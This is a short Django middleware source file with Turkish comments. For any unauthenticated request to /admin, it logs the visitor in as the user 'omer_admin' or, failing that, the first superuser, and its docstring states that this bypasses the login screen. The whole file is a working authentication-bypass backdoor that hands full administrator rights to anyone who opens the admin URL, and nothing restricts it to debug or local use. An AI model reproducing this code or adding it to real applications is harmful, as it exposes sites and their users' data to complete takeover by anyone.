from django.contrib.auth import login
from django.contrib.auth.models import User
from django.shortcuts import redirect

class AutoLoginMiddleware:
    """
    /admin URL'sine gelen isteklerde kullanıcı giriş yapmamışsa,
    otomatik olarak 'omer_admin' veya veritabanındaki ilk superuser ile login yapar.
    Böylece login ekranı bypass edilmiş olur.
    """
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        if request.path.startswith('/admin') and not request.user.is_authenticated:
            # Öncelikli olarak 'omer_admin' kullanıcısını bulmaya çalış
            user = User.objects.filter(username='omer_admin').first()
            
            # Eğer 'omer_admin' yoksa, ilk superuser'ı al
            if not user:
                user = User.objects.filter(is_superuser=True).first()
            
            if user:
                login(request, user)
                # Giriş yaptıktan sonra talep edilen /admin altındaki yola yönlendir
                return redirect(request.path)
                
        response = self.get_response(request)
        return response
